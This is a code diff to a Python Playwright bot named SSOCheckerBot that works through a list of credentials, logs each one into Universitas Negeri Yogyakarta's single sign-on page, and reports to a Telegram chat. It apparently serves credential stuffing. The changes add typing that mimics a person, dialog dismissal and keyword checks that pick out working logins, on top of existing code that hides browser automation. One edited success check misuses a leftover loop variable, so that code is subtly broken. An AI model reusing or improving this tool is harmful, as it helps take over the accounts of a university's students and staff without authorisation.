@@ -36,6 +36,7 @@ class SSOCheckerBot:
                 '--disable-dev-shm-usage',
                 '--disable-gpu',
                 '--disable-blink-features=AutomationControlled',
+                '--window-size=1920,1080',
             ]
         )
         
@@ -50,6 +51,9 @@ class SSOCheckerBot:
         self.page.add_init_script("""
             Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
         """)
+        
+        # Auto-dismiss dialogs (setara alert.accept() di Selenium)
+        self.page.on("dialog", lambda dialog: dialog.accept())
         
         print("✅ Playwright Chromium browser initialized")
     
@@ -112,7 +116,7 @@ class SSOCheckerBot:
             
             # Clear session
             self.context.clear_cookies()
-            self.page.goto("https://sso.uny.ac.id", wait_until="domcontentloaded", timeout=15000)
+            self.page.goto("https://sso.uny.ac.id", wait_until="networkidle", timeout=15000)
             
             wait_time = random.uniform(1, 2)
             time.sleep(wait_time)
@@ -140,51 +144,87 @@ class SSOCheckerBot:
                 self.bot.send_message(self.chat_id, error_msg)
                 return False, "Rate limit exceeded"
             
-            # Fill form
+            # Fill form (mirip Selenium: clear dulu, lalu ketik)
             try:
-                # Email field
-                email_field = self.page.locator("input[name='username'], input[type='text']").first
-                email_field.fill(email)
+                # Email field - cari dan isi
+                email_field = self.page.query_selector("input[name='username']")
+                if not email_field:
+                    email_field = self.page.query_selector("input[type='text']")
+                
+                if not email_field:
+                    return False, "Email field tidak ditemukan"
+                
+                # Clear field dulu (seperti Selenium .clear())
+                email_field.click()
+                time.sleep(0.1)
+                self.page.keyboard.press("Control+A")
+                self.page.keyboard.press("Delete")
+                time.sleep(0.1)
+                email_field.type(email, delay=30)
                 time.sleep(0.3)
                 
                 # Password field
-                password_field = self.page.locator("input[name='password'], input[type='password']").first
-                password_field.fill(password)
+                password_field = self.page.query_selector("input[name='password']")
+                if not password_field:
+                    password_field = self.page.query_selector("input[type='password']")
+                
+                if not password_field:
+                    return False, "Password field tidak ditemukan"
+                
+                password_field.click()
+                time.sleep(0.1)
+                self.page.keyboard.press("Control+A")
+                self.page.keyboard.press("Delete")
+                time.sleep(0.1)
+                password_field.type(password, delay=30)
                 time.sleep(0.3)
                 
-                # Click login
-                login_button = self.page.locator("button[type='submit'], input[type='submit']").first
+                # Click login button
+                login_button = self.page.query_selector("button[type='submit']")
+                if not login_button:
+                    login_button = self.page.query_selector("input[type='submit']")
                 
-                try:
-                    login_button.click()
-                except:
+                if login_button:
                     try:
-                        self.page.evaluate("document.querySelector(\"button[type='submit'], input[type='submit']\").click()")
+                        login_button.click()
                     except:
-                        email_field.press("Enter")
+                        try:
+                            self.page.evaluate("document.querySelector(\"button[type='submit'], input[type='submit']\").click()")
+                        except:
+                            email_field.press("Enter")
+                else:
+                    # Fallback: submit via Enter
+                    self.page.keyboard.press("Enter")
                 
-                # Wait for navigation/response
+                # Wait for response (seperti Selenium time.sleep(2))
+                time.sleep(2)
+                
+                # Tunggu sampai page selesai load
                 try:
-                    self.page.wait_for_load_state("networkidle", timeout=8000)
+                    self.page.wait_for_load_state("networkidle", timeout=5000)
                 except:
-                    time.sleep(2)
+                    time.sleep(1)
                 
-                # Auto-dismiss alerts via dialog handler (Playwright handles this differently)
-                # Playwright auto-dismisses dialogs by default, but we can set handler
-                
-                # Try clicking OK buttons on modals
-                try:
-                    ok_button = self.page.locator("button:has-text('OK'), button:has-text('Ok'), button[aria-label='OK']").first
-                    if ok_button.is_visible(timeout=1000):
-                        ok_button.click()
-                        time.sleep(1)
-                except:
-                    pass
-                
-                # Press Escape to dismiss any popups
+                # Dismiss alerts / popups
                 try:
                     self.page.keyboard.press("Escape")
                     time.sleep(0.2)
+                except:
+                    pass
+                
+                # Klik tombol OK jika ada modal
+                try:
+                    ok_buttons = self.page.query_selector_all("button")
+                    for btn in ok_buttons:
+                        try:
+                            text = btn.inner_text().strip()
+                            if text in ['OK', 'Ok', 'ok']:
+                                if btn.is_visible():
+                                    btn.click()
+                                    time.sleep(1)
+                                    break
+                        except:
+                            continue
                 except:
                     pass
                 
@@ -205,26 +245,33 @@ class SSOCheckerBot:
                     "couldn't sign you in", 'hubungi admin domain'
                 ]
                 
-                # Success indicators
+                # Success indicators (hanya yang spesifik post-login)
                 success_keywords = [
-                    'dashboard', 'logout', 'beranda', 'profile',
-                    'welcome', 'home', 'berhasil', 'selamat',
+                    'dashboard', 'logout', 'beranda',
+                    'berhasil', 'selamat',
                     'sign out', 'keluar'
                 ]
                 
+                # SSO UNY success markers (TANPA 'single sign on uny' karena ada di halaman login!)
                 sso_success_markers = [
-                    'berhasil masuk', 'selamat', 'single sign on uny',
-                    'webmail', 'siakad', 'registrasi', 'besmart'
+                    'berhasil masuk', 'selamat datang',
+                    'webmail', 'siakad', 'besmart'
                 ]
                 
                 # Check Google error page
                 if 'accounts.google.com' in current_url and ('error' in current_url.lower() or 'signin' in current_url.lower()):
                     return False, "Google error page"
                 
-                # Check fail keywords
+                # Check fail keywords FIRST
                 for keyword in fail_keywords:
                     if keyword in page_source:
                         return False, f"Autentikasi gagal: {keyword}"
+                
+                # Cek apakah masih ada form login di halaman (berarti BELUM login)
+                login_form_exists = (
+                    self.page.query_selector("input[name='username']") is not None
+                    and self.page.query_selector("input[name='password']") is not None
+                )
                 
                 # Check SSO success markers
                 marker_hits = [m for m in sso_success_markers if m in page_source]
@@ -233,15 +280,24 @@ class SSOCheckerBot:
                 
                 # Check success keywords
                 for keyword in success_keywords:
-                    if keyword in current_url.lower() or keyword in page_source:
-                        return True, f"Login berhasil: {keyword}"
+                    if keyword in page_source:
+                        # Pastikan bukan masih di halaman login
+                        if not login_form_exists:
+                            return True, f"Login berhasil: {keyword}"
                 
-                # Check redirect
-                if current_url != "https://sso.uny.ac.id" and 'google.com' not in current_url:
-                    return True, "Login berhasil (redirect)"
+                # Check URL-based success (bukan di halaman login lagi)
+                if keyword in current_url.lower():
+                    for kw in success_keywords:
+                        if kw in current_url.lower():
+                            return True, f"Login berhasil (URL): {kw}"
+                
+                # Check redirect (hanya jika form login sudah tidak ada)
+                if not login_form_exists:
+                    if current_url != "https://sso.uny.ac.id" and 'google.com' not in current_url and 'sso.uny.ac.id' not in current_url:
+                        return True, "Login berhasil (redirect)"
                 
                 # Still at login page
-                if ('sso.uny.ac.id' in current_url or 'login' in current_url.lower()) and len(marker_hits) < 2:
+                if login_form_exists or 'sso.uny.ac.id' in current_url or 'login' in current_url.lower():
                     return False, "Masih di halaman login"
                 
                 return False, "Tidak ada indikator sukses"
@@ -258,9 +314,6 @@ class SSOCheckerBot:
             # Setup browser
             self.bot.send_message(self.chat_id, "🚀 Memulai browser (Playwright)...")
             self.setup_browser()
-            
-            # Set dialog handler (auto-dismiss alerts)
-            self.page.on("dialog", lambda dialog: dialog.accept())
             
             total = len(self.credentials)
             
